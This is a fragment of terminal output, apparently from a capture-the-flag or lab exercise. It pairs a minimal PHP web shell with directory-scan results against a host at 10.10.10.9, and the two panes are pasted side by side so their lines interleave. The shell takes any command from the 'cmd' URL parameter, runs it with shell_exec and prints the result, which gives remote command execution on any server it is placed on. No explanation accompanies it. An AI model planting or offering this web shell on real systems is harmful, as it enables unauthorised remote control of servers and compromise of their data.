<?php                                                                                              │+ http://10.10.10.9//user/login/ (CODE:200|SIZE:7452)                                                        
if (!empty($_GET['cmd'])) {                                                                       │                                                                                                   
    $cmd = shell_exec($_GET['cmd']);                                                              │+ http://10.10.10.9//user/logout/ (CODE:403|SIZE:1233)                                                       
    echo $cmd;	
}                                                                                                  │                                                                                                   
?> 
